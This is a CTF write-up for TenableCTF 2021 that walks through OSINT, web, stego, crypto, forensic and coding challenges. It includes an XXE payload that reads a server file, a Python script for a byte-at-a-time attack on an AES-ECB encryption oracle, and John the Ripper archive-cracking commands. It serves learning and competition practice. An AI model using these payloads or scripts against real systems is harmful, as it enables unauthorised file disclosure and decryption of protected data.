---
title: "CTF - TenableCTF 2021"
categories: [ctf]
date: 2021-02-20
comments: true
image: /images/writeups/TenableCTF/logo.png
description: CTF - TenableCTF 2021
---

# TenableCTF 2021

<p align="center">
  <img src="/images/writeups/TenableCTF/logo.png" width="300"/>
</p>

I participate in this CTF for team [ISwearIGoogledIt](https://ctftime.org/team/109689) and got some challenges!

<p align="center">
  <img src="/images/writeups/TenableCTF/rank.png" width="500"/>
</p>

---

### OSINT

- [We're watching you](#we-re-watching-you)

### Web

- [Send A Letter](#send-a-letter)
- [Follow The Rabbit Hole](#follow-the-rabbit-hole)

### Misc

- [Broken QR](#broken-qr)
- [Find the encoding](#find-the-encoding)
- [Forwards from Grandma](#forwards-from-grandma)

### Stego

- [Numerological](#numerological)
- [Secret Images](#secret-images)
- [Weird Transmission](#weird-transmission)
- [A3S Turtles](#a3s-turtles)

### Crypto

- [Easy Peasy](#easy-peasy)
- [Netrunner Encryption](#netrunner-encryption)

### Forensic

- [H4ck3R_m4n exp0sed! 2](#h4ck3r-m4n-exp0sed-2)
- [H4ck3R_m4n exp0sed! 3](#h4ck3r-m4n-exp0sed-3)

### Code

- [Short and sweet](#short-and-sweet)
- [Find largest triangle](#find-largest-triangle)
- [Parsey Mcparser](#parsey-mcparser)


---

# OSINT

##  We re watching you
75

NOTE: Our chat bot will not help you with this challenge. Please do not use it for this ctf!

The challenge shows a Peekaboo gif with a KPop artist. RazviOverflow went over that track and found nothing. Tenable discovered a vulnerability and they called it Peekaboo, that could be a great place to work on. 

We can visited their blog post:

https://www.tenable.com/blog/peekaboo

And look over different related pages until the flag showed up on one of them:

https://www.tenable.com/security/research/tra-2018-25

<p align="center">
  <img src="/images/writeups/TenableCTF/OSINT/1_flag.png" width="50%"/>
</p>


---

# Web

## Send A Letter
50

There is a web app at http://challenges.ctfd.io:30471/. Find the vulnerability, exploit it, and recover the flag.

We can see an strange encoding on the XML. Googling for it I found XXE vulnerability on [OWASP](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)\_Processing).

We can use one of the templated to speed up the attack.
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///tmp/messages_outbound.txt" >]>
<letter><name>&xxe;</name></letter>
```

We can use [URL Encoder](https://www.urlencoder.org/) and Burp to repeat the attack:

<p align="center">
  <img src="/images/writeups/TenableCTF/Web/XXE/1_flag.png" width="50%"/>
</p>

```
%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%0A%3C%21DOCTYPE%20foo%20%5B%0A%20%20%20%3C%21ELEMENT%20foo%20ANY%20%3E%0A%20%20%20%3C%21ENTITY%20xxe%20SYSTEM%20%20%22file%3A%2F%2F%2Ftmp%2Fmessages_outbound.txt%22%20%3E%5D%3E%0A%3Cletter%3E%3Cname%3E%26xxe%3B%3C%2Fname%3E%3C%2Fletter%3E
```

``` flag{xxe_aww_yeah} ```


##  Follow The Rabbit Hole
100

Follow the rabbit hole and get the flag.

http://167.71.246.232/

We get into a website with the following URL and this content:

```
http://167.71.246.232:8080/rabbit_hole.php?page=cE4g5bWZtYCuovEgYSO1
[513, '71'] 4O48APmBiNJhZBfTWMzD

http://167.71.246.232:8080/rabbit_hole.php?page=4O48APmBiNJhZBfTWMzD
[803, 'A5'] dUfob5k9t2vH1dVEU9bU

http://167.71.246.232:8080/rabbit_hole.php?page=dUfob5k9t2vH1dVEU9bU
[371, '08'] EiFCRRS86AT19seqH1ls
...
```

We have like a flow of URLs and and array with an int and a string. Let's make an script to retrieve all the URLs and also the content of the HTML. After messing around with the messages I though that the first array could be a key:value pair:

{% highlight python%}
import requests
import re
import json

url = 'http://167.71.246.232:8080/rabbit_hole.php?page='
path = 'cE4g5bWZtYCuovEgYSO1'
exp = r"\[([\d]+), '([\w]+)'\]\n.(.*)"
array = {}
paths = []

i = 0

while True:
	try:
		r = requests.get(url+path)
		print(r.text)
		
		content = re.search(exp, r.text)
		array[content.group(1)] = content.group(2)
		path = content.group(3)
		i += 1
		print(i)
	except AttributeError:
		break
	except Exception:
		break

with open('result.json', 'w') as out_file:
	json.dump(array, out_file, indent=4, sort_keys=True)	

with open('paths.json', 'w') as out_file:
	json.dump(paths, out_file, indent=4)
{% endhighlight %}

To follow the current approach I set the key as the order in a string and merge the values in order with the following code:

{% highlight python%}
import json

with open('result.json', 'r') as in_file:
	arrays = json.load(in_file)

content = []
for i in range(0, len(arrays)):
	content.append(arrays[str(i)])

with open('values.txt', 'w') as out_file:
	out_file.write(''.join(content))
{% endhighlight %}

It seems like hex, so quick check on CyberChef build up an image with the flag:

<p align="center">
  <img src="/images/writeups/TenableCTF/Web/Follow/1_flag.png" width="50%"/>
</p>

---

# Misc

## Broken QR
100

Can you scan this QR code for me?

We got a broken QR, a quick Paint and some redundancy on the QR code maybe will do the job.

<p align="center">
  <img src="/images/writeups/TenableCTF/Misc/BrokenQR/qr_fix.png" width="40%"/>
</p>

<p align="center">
  <img src="/images/writeups/TenableCTF/Misc/BrokenQR/flag.jpeg" width="40%"/>
</p>

``` flag{d4mn_it_w0nt_sc4n} ```


## Find the encoding
50

DeZmqMUkDJceycJHJPzZet

With the magic function on [CyberChef](https://gchq.github.io/CyberChef/), we can see the base58 as recommended encoding.

``` flag{not_base64} ```


## Forwards from Grandma
100

My grandma sent me this email, but it looks like there's a hidden message in it. Can you help me figure it out?

We have an email with the following subject, which is suspicious:

```
FWD: FWD: RE: FWD:  FWD: RE: FWD: FWD:  FWD: RE:  RE: RE: FWD: { FWD: FWD:  FWD: FWD: RE: RE: FWD: RE:  RE: RE:  FWD: FWD:  FWD: FWD: FWD:  FWD: FWD: FWD:  FWD: FWD: RE: RE: FWD: RE:  FWD: RE:  RE: RE: RE:  FWD: RE: FWD: FWD: } THIS IS HILARIOUS AND SO TRUE
```

```
Let's sustitute the FWD and RE for dot and dash respectively:
FWD: .
RE: -

..-. .-.. .- --. {.. ..--.- -- .. ... ... ..--.- .- --- .-.. } 
```

Decode morse code:

``` flag{I_MISS_AOL} ```

---

# Stego

##  Numerological
100

While working on his latest historical fact book, Don Beige came across a weird group of monks whose only communication with one another was to message the same picture back and forth.

Don thinks there must be something more going on and grabbed a sample.

Can you help him solve this case?


We got an image:

<p align="center">
  <img src="/images/writeups/TenableCTF/Stego/Shield/shield.png" width="40%"/>
</p>

By using binwalk we retrieve another image:

``` binwalk -M --dd=.* shield.png ```

<p align="center">
  <img src="/images/writeups/TenableCTF/Stego/Shield/monk.png" width="50%"/>
</p>

Seems like Cisternian numbers. Let's use [dcode](https://www.dcode.fr/cistercian-numbers) to retrieve the numbers. Remember that to introduce the input on dcode website, we have to start from the bottom left corner to bottom right, then top left and finally top right.

<p align="center">
  <img src="/images/writeups/TenableCTF/Stego/Shield/numbers.png" width="50%"/>
</p>

3637 3639 3734 3265 3639 3666 3266 3461 3734 3461 3631 3538

363736393734326536393666326634613734346136313538

Decode Hex > Decode Hex > git.io/JtJaX

On that git post we can find the flag:

``` flag{th0s3_m0nk5_w3r3_cl3v3r} ```

## Secret Images

The challenge provide us two images:

<p align="center">
  <img src="/images/writeups/TenableCTF/Stego/Secret/crypted1.png" width="40%"/>
</p>
<p align="center">
  <img src="/images/writeups/TenableCTF/Stego/Secret/crypted2.png" width="40%"/>
</p>

We can see differences on both images. I created a python script to change to black pixels that are within a range of difference.

{% highlight python %}

from PIL import Image

def difference(pix1, pix2):
	suma = 0
	for i in range(0,2):
		suma += pix1[i] - pix2[i]
	return suma

im = Image.open('crypted1.png')
im2 = Image.open('crypted2.png')

black = 0
red = 0

width, height = im.size

for x in range(0,width):
	for y in range(0,height):
		current_color = im.getpixel((x,y))
		current_color2 = im2.getpixel((x,y))

		if difference(current_color,current_color2) > 2:
			im2.putpixel((x,y), (0, 0, 0, 255))

im2.show() 

{% endhighlight %}

We can barely see the flag. Watch out, you might get blind looking for the flag.

<p align="center">
  <img src="/images/writeups/TenableCTF/Stego/Secret/1_flag.png" width="50%"/>
</p>

``` flag{otp_reuse_fail} ```


##  Weird Transmission
175

There seems to be this weird extraterrestrial communication broadcast in our discord. Can you help us decode it?

Seems like SSTV signal. Redirect the output from the audio into a virtual sound card and use RX SSTV program to decode it. It seems like it's cut out and I found no way to get the original resolution. With Scotie 1 that's all I could get and filling with the flag prefix will do the job:

<p align="center">
  <img src="/images/writeups/TenableCTF/Stego/Weird/1_flag.jpg" width="50%"/>
</p>

``` flag{Noah_th3_s4vi0ur} ```


## A3S Turtles
250

Turtles all the way down.


We got a zip with password, let's use JohnTheRipper to retrieve the password:

```
kali@kali:/opt/john/john/run$ ./zip2john ~/Desktop/CTFs/Tenable/Stego/Turtle/turtles128.zip > ~/Desktop/CTFs/Tenable/Stego/Turtle/zip.hashes
ver 2.0 turtles128.zip/turtles127.zip PKZIP Encr: cmplen=19073, decmplen=19051, crc=CBB89A0B type=8
kali@kali:/opt/john/john/run$ ./john ~/Desktop/CTFs/Tenable/Stego/Turtle/zip.hashes
Proceeding with incremental:ASCII
0                (turtles128.zip/turtles127.zip)
```

First password is 0, then a new zipfile showed up:

```
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with incremental:ASCII
0                (turtles127.zip/turtles126.zip)
```

Then other zip, now with password 1:

```
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:./password.lst
1                (turtles126.zip/turtles125.zip)
```

Maybe a binary sequence??

I have developed the following bash script to get all the zips out and retireve the inner file and the sequence suposing that there would be 127 zips:

{% highlight bash %}
#!/bin/bash

filename=$1
x=0
arr=()
while [ $x -le 127 ]
do
	echo "$filename"
	file $filename | grep "zip"
	if [ "$?" -eq "0" ]
	then
		echo "Unzipping $filename"
		
		if unzip -P "0" $filename ; then
		    arr+=(0)
		else
		    unzip -P "1" $filename
		    arr+=(1)
		fi

		rm $filename
		filename=$(ls *zip)
		x=$(( $x + 1 ))
	fi
done
echo ${arr[@]}
{% endhighlight %}

The binary output of all the passwords were:

```
00111101110010010000011011110110100100101000111011101000100000101100110010110001101110001011110111010001010010101010001001001100
```

Also at the end of the zips we found a **key.png** file with the following text:

```
ed570e22d458e25734fc08d849961da9
```

<p align="center">
  <img src="/images/writeups/TenableCTF/Stego/Turtle/key.png" width="40%"/>
</p>

Seems like it has no flag at all, no hexdump or base64 from it. I'm stucked at the moment.

Going back to the challenge and the information I had the following clues: First, the title is a3s, which can be AES cipher (?). Second, the name of th file within the zips: **key.png** that provides a 32 bytes key. I digged until I found a way to operate the algorithm and extract the flag:

From the 128 bits message I obtained 32 bytes, converting the binary into hexadecimal:

``` 3dc906f6928ee882ccb1b8bdd14aa24c ```

Now we don't have any clue about an Initialization Vector (IV) needed on some of the AES operation modes, so we can think about Electronic CodeBook (ECB) which doesn't need IV. And looks like we got the flag:

<p align="center">
  <img src="/images/writeups/TenableCTF/Stego/Turtle/1_flag.png" width="50%"/>
</p>

``` flag{steg0_a3s} ```

---

# Crypto

## Easy Peasy
50

Find the flag here:

NzMgNzkgNmUgNzQgN2IgNzAgNjIgNjEgNzQgNjUgNmUgNjcgNjYgNWYgNmMgNjIgNjggNWYgNzQgNjIgNjcgNWYgN2EgNzIgN2Q=

- First base64:

73 79 6e 74 7b 70 62 61 74 65 6e 67 66 5f 6c 62 68 5f 74 62 67 5f 7a 72 7d

- Convert into ASCII:

synt{pbatengf_lbh_tbg_zr}

- ROT13:

```flag{congrats_you_got_me} ```


## Netrunner Encryption
200

Take a look at the new encryption tool out that netrunner gonk friends are using:

http://167.71.246.232:8080/crypto.php

We can find the server encription method. We can see that the server uses AES with ECB mode, which we know it to be vulnerable due to the no usage of IV and there is no randomness derivation over each block encripted. We can see that the server retrieves our input, appends the flag and then it pads until the end of the block:

```
|userinpuuuutttfl| |ag{this_is_a_fla| |g}paddingpadding|
```

{% highlight php %}

<?php

function pad_data($data){
  $flag = "flag{wouldnt_y0u_lik3_to_know}"; 
  #
  $pad_len = (16 - (strlen($data.$flag) % 16));
  return $data . $flag . str_repeat(chr($pad_len), $pad_len);
}

if(isset($_POST["do_encrypt"])){

  $cipher = "aes-128-ecb";
  $iv  = hex2bin('00000000000000000000000000000000');
  $key = hex2bin('74657374696E676B6579313233343536');
  echo "</br><br><h2>Encrypted Data:</h2>";
  $ciphertext = openssl_encrypt(pad_data($_POST['text_to_encrypt']), $cipher, $key, 0, $iv); 

  echo "<br/>";
  echo "<b>$ciphertext</b>";
}
?>

{% endhighlight %}

I could implement the PHP AES algorithm to guess the flag, but I went against the server. I have implemented the following python algorithm to go over every character and guess it using the characters that could be on the flag. A great explanation can be found on [Zach Grace post](https://zachgrace.com/posts/attacking-ecb/).

{% highlight python %}
mport requests
import base64
import re
import time
import string

# 74657374696E676B6579313233343536 = testingkey123456

def send_data(input_text):

	data1 = {
		'text_to_encrypt':input_text,
		'do_encrypt':'Encrypt'
	}

	r = requests.post('http://167.71.246.232:8080/crypto.php', data=data1)

	regex = r'<b>(.*)<\/b>'
	base = re.search(regex, r.text)

	base64_message = base64.b64decode(base.group(1))

	return base64_message


def get_payload_len():
	# |aaaaaflag{bbbbbb| |bbbbbbbbbbbbbbbb| |bbbbbbbbbbbbbbbb| |}padpadpadpadpad| 

	payload_len = 0

	for i in range(0, 32):

		send = 'a'*i
		print(send)
		time.sleep(0.5)

		recv_data = send_data(send)

		# Get first data length
		if i == 0:
			recv_data_len = len(recv_data)

		if recv_data_len != len(recv_data):
			block_size = len(recv_data) - recv_data_len
			payload_len = len(recv_data) - len(send) - block_size-1
			break

		print(len(send), len(send_data(send)))

	print('Payload length: {}\nBlock size: {}'.format(payload_len, block_size))



def attack(block_size=16, payload_size=41):

	# The flag is composed of lowercase, numbers and underscore
	chars = '_' + string.ascii_lowercase + string.digits + '{' + '}'

	# We know that the flag starts like this, so we can save those requests
	flag = [char for char in 'flag{']
	counter = len(flag) + 1

	for n in range(0, payload_size):

		# We send 16 + 10 'a' so the server fills with flag{X:
		# aaaaaaaaaaaaaaaa aaaaaaaaaa
		# aaaaaaaaaaaaaaaa aaaaaaaaaaflag{X
		
		send = 'a' * ((block_size*2)-counter)

		# The server will encrypt the part of the flag. We save it for latter. 
		recv_data = send_data(send)		
		print(send)
		time.sleep(1)

		for ch in chars:

			# We recreate the payload 
			
			# aaaaaaaaaaaaaaaa aaaaaaaaaa
			ls = ['a' for i in range((block_size*2)-counter)]

			# Append the flag that we have:
			# aaaaaaaaaaaaaaaa aaaaaaaaaaflag{
			ls.extend(flag)

			# Append the guessed char:
			# aaaaaaaaaaaaaaaa aaaaaaaaaaflag{a
			ls.append(ch)
			send = ''.join(ls)
			print(send)

			# We receive the ciphertext from our guess
			recv_data2 = send_data(send)

			# Check if the guess is the same as the previous server encription
			if recv_data[:(block_size*2)] == recv_data2[:(block_size*2)]:
				
				flag.append(ch)
				counter = len(flag) +1
				print('flag: {}'.format(''.join(flag)))
				break

attack()
{% endhighlight %}

``` flag{b4d_bl0cks_for_g0nks} ```

---

# Forensic

## H4ck3R_m4n exp0sed! 2
25

I got this packet capture with some of the notorious h4ckerm4n's secret information.

The flag for this challenge should make my boss angry.


A pcapng file is provided. First impressions showed an FTP file transmission. To retrieve the **supersecure.7z** file, go to any of the packets in the stream, right click Follow > Follow TCP Stream:

<p align="center">
  <img src="/images/writeups/TenableCTF/Forensic/Hackerman/1_ftp.png" width="50%"/>
</p>

We can see the data in ASCII of the 7z file:

<p align="center">
  <img src="/images/writeups/TenableCTF/Forensic/Hackerman/1_follow.png" width="50%"/>
</p>

Now, to save it, select the raw at the menu and save it with whatever name:

<p align="center">
  <img src="/images/writeups/TenableCTF/Forensic/Hackerman/1_save.png" width="40%"/>
</p>

The 7z file has a password. looking back into the FTP session, we can see at the beginning that the attacker used **hunter2** as password, but didn't work as password for the 7z:

<p align="center">
  <img src="/images/writeups/TenableCTF/Forensic/Hackerman/1_pass.png" width="40%"/>
</p>

Let's crack it with JohnTheRipper:
Since 7z2john is written on perl on the official repo, I had to install it:

```
sudo apt install libcompress-raw-lzma-perl -y
```

I was too greedy on the cracking stage. While crcking I inspected the pcapng file and found the password ^^'

<p align="center">
  <img src="/images/writeups/TenableCTF/Forensic/Hackerman/1_password.png" width="50%"/>
</p>

Within there are 2 files, one of them is a PNG, showing the flag:

<p align="center">
  <img src="/images/writeups/TenableCTF/Forensic/Hackerman/pickle_nick.png" width="40%"/>
</p>

``` flag{pickl3_NIIICK} ```


## H4ck3R_m4n exp0sed! 3
50

I got this packet capture with some of the notorious h4ckerm4n's secret information.

The flag for this challenge should give you unrealistic expectations.

On the previous 7z file, there were 2 files, one of them a PNG and the other a plain text document. The content seens to be hexadecimal:

```
6a 7a 34 73 7a 51 71 34 53 73 76 75 68 42 41 67 43 6c 75 57 76 48 62 34 71 66 49 49 64 56 34 4d 72 38 38 48 62 51 66 43 76 47 2f 49 38 48 76 54 32 58 73 65 42 42 4c 38 49 6e 79 4e 4c 38 62 44 ...
```

We end up with a base64 string:

```
/9j/4AAQSkZJRgABAQAASABIAAD/4QBYRXhpZgAATU...
```

Then, a familiar file header showed up:

```
ÿØÿà
```

Seems like a JPEG:

<p align="center">
  <img src="/images/writeups/TenableCTF/Forensic/Hackerman/flag.jpeg" width="50%"/>
</p>

```flag{20_minute_adventure}```

---

# Code

## Short and sweet

Below is some code that reads integers from stdin and pases a list of them to a function named "AreNumbersEven". Implement the "AreNumbersEven" function.
This function takes a list of integers and returns a boolean list: True if number was even, and False if odd.
If implemented right, the attached code will print the answer returned from your function.
stdin example:
66 0 -47 
stdout example:
[True, True, False] 

{% highlight python %}

def AreNumbersEven(numbers):
	#impliment here
	booleans = []
	for num in numbers:
		booleans.append(num%2==0)
	# Read space delimited integers from stdin and 
	# pass a list of them to AreNumbersEven()
	return booleans
numbers = raw_input()
integer_list = [int(i) for i in numbers.split(' ')]
even_odd_boolean_list = AreNumbersEven(integer_list)
print even_odd_boolean_list

{% endhighlight %}


## Find largest triangle

{% highlight python %}

# points is a list of 3D points
# ie: [[2, 9, -15], [0, 33, -20], ...]
from itertools import combinations

# Can use this function instead of combinations
def combine(lst, n): 
      
    if n == 0: 
        return [[]] 
      
    l =[] 
    for i in range(0, len(lst)): 
          
        m = lst[i] 
        remLst = lst[i + 1:] 
          
        for p in combine(remLst, n-1): 
            l.append([m]+p) 
              
    return l

#determinant of matrix a
def det(a):
    return a[0][0]*a[1][1]*a[2][2] + a[0][1]*a[1][2]*a[2][0] + a[0][2]*a[1][0]*a[2][1] - a[0][2]*a[1][1]*a[2][0] - a[0][1]*a[1][0]*a[2][2] - a[0][0]*a[1][2]*a[2][1]

#unit normal vector of plane defined by points a, b, and c
def unit_normal(a, b, c):
    x = det([[1,a[1],a[2]],
             [1,b[1],b[2]],
             [1,c[1],c[2]]])
    y = det([[a[0],1,a[2]],
             [b[0],1,b[2]],
             [c[0],1,c[2]]])
    z = det([[a[0],a[1],1],
             [b[0],b[1],1],
             [c[0],c[1],1]])
    magnitude = (x**2 + y**2 + z**2)**.5
    return (x/magnitude, y/magnitude, z/magnitude)

#dot product of vectors a and b
def dot(a, b):
    return a[0]*b[0] + a[1]*b[1] + a[2]*b[2]

#cross product of vectors a and b
def cross(a, b):
    x = a[1] * b[2] - a[2] * b[1]
    y = a[2] * b[0] - a[0] * b[2]
    z = a[0] * b[1] - a[1] * b[0]
    return (x, y, z)

#area of polygon poly
def area(poly):
    if len(poly) < 3: # not a plane - no area
        return 0

    total = [0, 0, 0]
    for i in range(len(poly)):
        vi1 = poly[i]
        if i is len(poly)-1:
            vi2 = poly[0]
        else:
            vi2 = poly[i+1]
        prod = cross(vi1, vi2)
        total[0] += prod[0]
        total[1] += prod[1]
        total[2] += prod[2]
    result = dot(total, unit_normal(poly[0], poly[1], poly[2]))
    return abs(result/2)

def FindLargestTriangleArea(points):
  # return largest area
  pass

# Reading space delimited points from stdin
# and building list of 3D points
points_data = raw_input()
points = []
for point in points_data.split(' '):
	point_xyz = point.split(',')
	points.append([int(point_xyz[0]), int(point_xyz[1]), int(point_xyz[2])])

comb = combinations(points, 3)  
areas_list = []
for i in comb:
	area2 = area(list(i))
	areas_list.append(int(round(area2)))
# Compute Largest Triangle and Print Area rounded to nearest whole number
#area = FindLargestTriangleArea(points)
print max(areas_list)

{% endhighlight %}


## Parsey Mcparser

{% highlight python %}
import re

def ParseNamesByGroup(blob, group_name):
	
	group_regex = r'\["age":(\d*), "user_name":"([\w ]*)", "Group":"([\w ]*)"\]'
	res = re.findall(group_regex, blob)

	group_guys = []
	for i in res:
		if i[2] == group_name:
			group_guys.append(i[1])
			
	return group_guys
   
data = raw_input()
group_name = data.split('|')[0]
blob = data.split('|')[1]

result_names_list = ParseNamesByGroup(blob, group_name)
print result_names_list
{% endhighlight %}


Thanks for reading!